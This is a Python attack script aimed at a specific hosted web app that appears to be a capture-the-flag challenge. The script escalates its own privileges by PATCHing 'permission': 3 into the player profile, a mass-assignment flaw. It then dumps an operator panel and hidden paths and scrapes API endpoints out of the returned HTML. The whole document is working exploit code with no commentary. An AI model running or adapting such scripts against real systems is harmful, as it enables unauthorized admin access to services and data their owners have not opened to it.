#!/usr/bin/env python3
import requests, re

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

# Elevate
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)

def req(method, path, **kw):
    try:
        r = getattr(s, method)(BASE + path, timeout=20, allow_redirects=False, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

# Full operator panel
code, body = req('get', '/operator/')
print('=== /operator/ (FULL) ===')
print(body)

print('\n\n=== /mineshaft/ ===')
code, body = req('get', '/mineshaft/')
print(f'[{code}]')
print(body[:3000])

print('\n\n=== /stronghold/ ===')
code, body = req('get', '/stronghold/')
print(f'[{code}]')
print(body[:3000])

# Extract all API links from operator panel HTML
print('\n\n=== Extracting links/endpoints from /operator/ ===')
code, op_body = req('get', '/operator/')
links = re.findall(r'(?:href|src|action|data-endpoint|fetch\(|url:)["\s]*["\']([^"\']+)["\']', op_body)
links += re.findall(r'/api[^\s"\'<>]+', op_body)
for l in set(links):
    print(' ', l)
